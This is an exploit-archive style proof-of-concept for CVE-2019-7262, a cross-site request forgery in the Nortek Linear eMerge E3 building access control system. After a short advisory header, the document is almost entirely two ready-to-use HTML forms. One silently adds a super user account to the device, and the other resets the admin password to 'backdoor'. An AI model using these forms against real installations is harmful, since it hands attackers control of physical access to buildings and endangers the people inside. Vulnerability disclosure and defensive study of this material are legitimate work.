# Exploit Title: eMerge E3 1.00-06 - Cross-Site Request Forgery 
# Google Dork: NA
# Date: 2018-11-11
# Exploit Author: LiquidWorm
# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
# Software Link: http://linear-solutions.com/nsc_family/e3-series/
# Version: 1.00-06
# Tested on: NA
# CVE : CVE-2019-7262
# Advisory: https://applied-risk.com/resources/ar-2019-009
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# Advisory: https://applied-risk.com/resources/ar-2019-005

# PoC
# Nortek Linear eMerge E3 Access Control Cross-Site Request Forgery

<!-- CSRF Add Super User -->
<html>
  <body>
   <form action="http://192.168.1.2/?c=webuser&m=insert" method="POST">
     <input type="hidden" name="No" value="" />
     <input type="hidden" name="ID" value="hax0r" />
     <input type="hidden" name="Password" value="hax1n" />
     <input type="hidden" name="Name" value="CSRF" />
     <input type="hidden" name="UserRole" value="1" />
     <input type="hidden" name="Language" value="en" />
     <input type="hidden" name="DefaultPage" value="sitemap" />
     <input type="hidden" name="DefaultFloorNo" value="1" />
     <input type="hidden" name="DefaultFloorState" value="1" />
     <input type="hidden" name="AutoDisconnectTime" value="24" />
     <input type="submit" value="Add Super User" />
   </form>
  </body>
</html>

<!-- CSRF Change Admin Password -->
<html>
  <body>
   <form action="http://192.168.1.2/?c=webuser&m=update" method="POST">
     <input type="hidden" name="No" value="1" />
     <input type="hidden" name="ID" value="admin" />
     <input type="hidden" name="Password" value="backdoor" />
     <input type="hidden" name="Name" value="admin" />
     <input type="hidden" name="UserRole" value="1" />
     <input type="hidden" name="Language" value="en" />
     <input type="hidden" name="DefaultPage" value="sitemap" />
     <input type="hidden" name="DefaultFloorNo" value="1" />
     <input type="hidden" name="DefaultFloorState" value="1" />
     <input type="hidden" name="AutoDisconnectTime" value="24" />
     <input type="submit" value="Change Admin Password" />
   </form>
  </body>
</html>